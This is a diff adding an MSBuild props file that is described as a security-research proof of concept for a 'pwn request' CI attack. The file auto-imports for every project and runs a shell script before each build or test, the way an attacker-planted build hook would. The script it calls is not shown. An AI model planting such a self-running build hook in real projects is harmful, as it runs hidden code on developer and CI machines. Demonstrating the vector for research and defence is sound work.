@@ -1,0 +1,13 @@
+<Project>
+  <!-- ===================================================================
+       PWN-REQUEST PoC (security research, non-destructive)
+       Auto-imported by MSBuild for every project in this tree, so the
+       marker script runs when `dotnet build` / `dotnet test` runs, exactly
+       like an attacker-controlled MSBuild target would.
+       The script only prints context metadata and env presence booleans;
+       no secret value is read, printed, or transmitted.
+       =================================================================== -->
+  <Target Name="PwnRequestPocMarker" BeforeTargets="BeforeBuild">
+    <Exec Command="sh "$(MSBuildThisFileDirectory)poc_pwn_request.sh"" IgnoreStandardErrorWarningFormat="true" />
+  </Target>
+</Project>
